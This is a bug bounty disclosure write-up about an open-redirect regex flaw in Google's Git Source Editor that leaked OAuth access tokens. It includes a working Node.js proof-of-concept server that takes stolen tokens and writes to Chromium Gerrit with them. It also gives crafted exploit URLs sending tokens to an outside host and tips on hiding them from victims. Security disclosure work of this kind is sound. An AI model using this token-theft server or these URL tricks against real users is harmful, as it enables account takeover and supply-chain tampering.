---
title: googlesource.com access_token leak (Awarded $7500)
---

A bug in the [Git Source Editor](https://source.android.com/docs/setup/contribute/source-editor), the official browser-based tool by Google for editing files in projects such as [Chromium](https://edit.chromium.org/edit) and [Android](https://ci.android.com/edit), allowed to leak the user's OAuth token by redirecting to an attacker-controlled URL supplied in the URL parameters.

Target: *Applications that permits taking over a Google account*  
Category: *Execute code on the client*

The following regex was used to validate the redirect URLs. Normally, the URL would be restricted to `*.googlesource.com` or `*.git.corp.google.com`.  
The regex, however, did not correctly validate the URLs, causing `https://android.googlesource.com/aogarantiza.com:1337#.googlesource.com/platform/build/+show/refs/heads/master/Changes.md` to send a request to `https://aogarantiza.com:1337`, instead of `https://android.googlesource.com`, This made it possible to leak the `access_token` to the attacker.

```js
L1.GERRIT_LINK_MATCHER = /(.*\/)?(.*?)\.((googlesource\.com)|(git\.corp\.google\.com))\/(.*)\/\+([a-zA-Z0-9]+)?(\/refs\/heads)?\/(.*?)[\/^](.*)/;
L1.GERRIT_LINK_MATCHER_FOR_CHANGE_FILE = /(.*\/)?(.*?)\.((googlesource\.com)|(git\.corp\.google\.com))\/?(\/c)?\/(.*)\/\+\/([0-9]+)\/([0-9]+)\/(.*)/;
L1.GERRIT_LINK_MATCHER_FOR_CHANGE_FILE_IN_GITLES = /(.*\/)?(.*?)\.((googlesource\.com)|(git\.corp\.google\.com))\/(.*)\/\+([a-zA-Z0-9]+)?(\/refs\/changes)?\/([0-9]+)\/([0-9]+)\/([0-9]+)[\/^](.*)/;

function Z1(a) {
    if (!Cra.some(function(g) {
        return null != g.exec((new URL(a)).origin)
    }))
        throw Error("Invalid host domain passed " + a);
    var d = L1.GERRIT_LINK_MATCHER.exec(a)
      , f = Dra.exec(a);
    if (f)
        return {
            host: f[2],
            project: f[6],
            branch: f[7],
            file: f[8]
        };
    if (d)
        return {
            host: d[2],
            project: d[6],
            branch: d[9],
            file: d[10]
        };
    throw Error("Unable to parse change pieces.");
}
```


# The report :)

Automatically assigned P2 by "google magic", later given S2 after human review.

server.js
```js
const http = require('http');
const https = require("https");
const url = require('url');
const fs = require('fs');

const port = 1338;

const app = (req, res) => {

  try {
    // Use this to avoid an error modal about Gerrit account missing.
    // We could leave modal to distract from the main error that shows the attacker URL.
    // Attacker URL could also be obscured further.
    console.info('Request origin:', req.headers.origin);
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Credentials', true);
  } catch(e) {
    console.info('Error');
  }

  res.statusCode = 200;

// Emulate a file listing (optional but errors look bad)
const dirResponse = {
  "id": "b939af01ca07f0caa68fb8d264a68b91e86efe70",
  "entries": [
    {
      "mode": 33188,
      "type": "blob",
      "id": "54c90ede642a93580a98eb4ed6e821749b04a989",
      "name": ".gitignore"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "daebd5231a3ec9aafd58e6f4075f3b63e4c3bd53",
      "name": "Changes.md"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "957da92f63926bf6013845f0ff0602d1f1620e0a",
      "name": "CleanSpec.mk"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "74b54fadd522b739407d7d71b4ea3503fc666aeb",
      "name": "Deprecation.md"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "44781a70880412fdd9007cc2bec16a4b09924c6d",
      "name": "METADATA"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "97fda40f7b2006ae5f6bc895a4a1d602ceb991c6",
      "name": "OWNERS"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "ce7515044e84d15868077c0a8319fc401442fc4d",
      "name": "PREUPLOAD.cfg"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "47809a95ac45ec11840166adac5eb31d3ed9c788",
      "name": "README.md"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "ea4788a1bc26b698697f9a1499cd2164e0d03d3d",
      "name": "Usage.txt"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "b31578a29b5c64e4fa690b8f4062e045ba01185a",
      "name": "buildspec.mk.default"
    },
    {
      "mode": 16384,
      "type": "tree",
      "id": "9a970257168359bda2226ac81dd945e41a3db224",
      "name": "common"
    },
    {
      "mode": 33188,
      "type": "blob",
      "id": "004788a1bc26b698697f9a1499cd2164e0d03d3d",
      "name": "HELLO_FROM_AO.txt"
    },
    {
      "mode": 33188,
      "type": "blob", // Type param will be injected as CSS class in an element, but this is of limited use
      "id": "00970257168359bda2226ac81dd945e41a3db224",
      "name": "HELLO_FROM_AO_SERVER" // Will be added as text
    },
  ]
};

  const query = url.parse(req.url, true).query;
  if (query?.format == "JSON") {
    res.end(")]}'"+JSON.stringify(dirResponse));
  } else if (query?.format == "TEXT") {
    res.end("TEXT RESPONSE");
  } else {
    res.end('Hello World');
  }

  if (!query.access_token) return

  const payloadTimestamp = new Date();
  // const payload = ' { "display_name": "PoC display name! Set on '+payloadTimestamp+'" }';
  const payload = ' { "status": "Hello from PoC by NDevTK. This field was set on '+payloadTimestamp+' by PoC script hosted on Alesandro Ortiz\'s server." }';
  const options = {
    hostname: 'chromium-review.googlesource.com',
    port: 443,
    path: '/a/accounts/self/status?access_token='+encodeURIComponent(query.access_token),
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
 }

 const api = https.request(options, (response) => {});
 api.write(payload);
 api.end();

};

https.createServer({
  key: fs.readFileSync('privkey.pem'),
  cert: fs.readFileSync('fullchain.pem')
}, app).listen(port, () => {
  console.log(`Server running on port ${port}`);
});
```

This uses Chromium's [Gerrit Code Review REST API](https://gerrit-review.googlesource.com/Documentation/rest-api.html).

# Attack scenario

Attackers can steal chromium.org OAuth access token from any user who visits a specially crafted URL.  
If a user has previously authorized the "Android Build Team" OAuth app [1], only visiting the URL is required. If a user has not previously authorized the OAuth app, the user will see a legitimate Google OAuth prompt for the app, and the user only needs to grant access to the legit OAuth app.
There are no other preconditions.

# Reproduction case:
PoC URL 1, sends creds to PoC server on `https://aogarantiza.com:1338` (loads legitimate file and also spoofs directory listing): 
`https://edit.chromium.org/edit?repo=android/platform/build/&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F`

PoC URL 1 loads a file from a *.googlesource.com repo and populates the directory listing with attacker-controlled content (seems limited to text via `name` and a CSS class injection via `type`).

Same as PoC URL 1 but with additional dummy params to obscure suspicious param in address bar:
`https://edit.chromium.org/edit?repo=android%2Fplatform%2Fbuild%2F&files=platform%2Fbuild%2Frefs%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md&project=android&theme=default&editmode=default&showfilelist=1&showsidebar=1&showfooter=1&quickstart=1&showfeedback=1&autosave=1&file=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%3Fhttps%3A%2F%2Faogarantiza.com%3A1338%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2F`

PoC URL 2, sends creds to PoC server on `https://aogarantiza.com:1337` (does not spoof directory listing):
`https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Faogarantiza.com%3A1337%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md`

PoC URL 3, sends creds to non-existent hostname: `https://edit.chromium.org/edit?file=https%3A%2F%2Fandroid.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md%2Fexample.example.example%23android.googlesource.com%2Fplatform%2Fbuild%2F%2Bshow%2Frefs%2Fheads%2Fmaster%2FChanges.md`

NOTE: For PoC URL 1 or 2, we highly recommend using a test Google account, since the access token will be sent to `https://aogarantiza.com:1337/1338` which is running the PoC server above. The PoC server will update the "About me" (status) field in Chromium Gerrit [2] but does not log the access token.

Setup if running PoC server yourself:
Run attached server.js with NodeJS (provide your own privkey.pem and fullchain.pem; we generated it using certbot from Let's Encrypt). The server must run over HTTPS.
When running PoCs, replace "aogarantiza.com:1337/1338" in PoC URL 1/2 with the origin of your server.

PoC, token sent to attacker server, OAuth app previously authorized scenario:
Navigate to PoC URL 1 or 2. After page loads, a token is sent to the attacker’s PoC server.


To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to `https://chromium-review.googlesource.com/settings/` while logged-in to the same Google account and observe the updated field.

PoC, token sent to attacker server, OAuth app not authorized scenario:
Navigate to PoC URL 1 or 2.
Click on "Log in" when prompted by the editor.
Go through OAuth flow (select Google account if prompted, then click "Allow" for the OAuth app).
After auth is completed, a token is sent to the attacker’s PoC server.


To demonstrate that the token has been stolen, the PoC server updates the user profile’s "About me" field in Chromium Gerrit [2]. To verify this, navigate to `https://chromium-review.googlesource.com/settings/` while logged-in to the same Google account and observe the updated field.

PoC, observing DevTools Network tab:
Open a new tab.
Open DevTools and switch to the Network tab.
Navigate the same tab to PoC URL 1, 2, or 3.
If logged out, follow steps 2-3 from the authorized scenario above.
After editor loads, observe a request to attacker URL (`https://aogarantiza.com:*`) with an access token of the OAuth app [1]. To more easily find the request, use the filter `domain:aogarantiza.com` (using the domain actually used in attack)

If the server receiving the request does not have the correct CORS headers, the server will still receive the token because the browser still needs to make the request to see which CORS headers (if any) the server will respond with. Therefore the attack is still successful even if you see the request "fail" due to a CORS error. The PoC server sends the appropriate headers, but you can modify the PoC to test the no-CORS-headers scenario.

In cases where an attacker knows the victim is already authorized on edit.chromium.org, the attacker can open the specially-crafted URL in a popup/popunder, then navigate away or close the page after the attack is completed. In the PoC URLs above, the attacker URL is also obscured in the URL params where it is less likely to be detected. A shorter, lookalike origin could also be used, such as `gsource[.]co`.

[1] The OAuth app used by edit.chromium.org is identified as "Android Build Team" when listed in https://myaccount.google.com/permissions, It seems to be the same OAuth app used in https://ci.android.com/edit  
[2] Chromium Gerrit: https://chromium-review.googlesource.com 

# Impacts

The scope of the leaked token is `email profile https://www.googleapis.com/auth/userinfo.profile openid https://www.googleapis.com/auth/gerritcodereview https://www.googleapis.com/auth/androidbuild.internal https://www.googleapis.com/auth/userinfo.email` (CLs may contain sensitive information, attacker could submit their own change as the victim, set victim's display name to a duck emoji)

- View and manage your Git repositories
- View and manage Internal Android Build status and results

Based on testing, token has permissions to read of Google account info, read+write access to most if not all Chromium Gerrit [2] endpoints, including Gerrit profile fields and access to git repositories (directory listings, read, write, etc.). We assume that if a user has access to restricted/internal git repositories, they would be accessible by the attacker with the user’s leaked token. We’re not sure what other permissions the "gerritcodereview" and "androidbuild.internal" scopes provide, This may include access to internal tools used by the repos.

e.g. make a commit as user A, review as user B, which is normal process, and approve commit as user C, and it all looks good externally unless one of those people finds it and realizes "hey, I didn't commit or review that" and maybe hide some tracks if you have some elevated privs like admin or something
mumbles something about software supply chain attacks being all the hotness right now.

With PoC URL 1, to obscure the attack the directory listing is spoofed to simulate a real directory listing, and a legitimate file is loaded. The directory listing contents can have any reasonable attacker-controlled text in it, although this is of limited use other than to avoid detection of attack.


Other instances of the editor may also be affected by this bug. For example, the editor used in the PoC is at `https://edit.chromium.org/edit`, but the same editor appears to be hosted at `https://ci.android.com/edit`. There may be internal instances of the editor or other public instances we aren’t aware of.

Access tokens may expire after a certain time period or can be revoked for other reasons.

There's an embed version of the [Git Source Editor](https://android-review.googlesource.com/plugins/git_source_editor/static/git_source_editor.html) that replaces `googlesource.com` URLs to `git.corp.google.com` (this is because `pluginMode` is `true`). We are not aware of any way to exploit this type of usage since it's not using OAuth. Using OAuth can however be forced using the `enable-gis` URL parameter.
```js
 state.store = {...state.store, pluginMode: true};
```

Also, there is an [interesting feature](https://gerrit-documentation.storage.googleapis.com/Documentation/3.1.2/config-gerrit.html#plugins.allowRemoteAdmin) in Gerrit, which could possibly be exploited to RCE with a jar file (if used with the correct token).


Credits:
- [Alesandro Ortiz](https://alesandroortiz.com/) for free server hosting for the PoC and helping with the report.
- [Thomas Orlita](https://websecblog.com/) for help with the writeup.
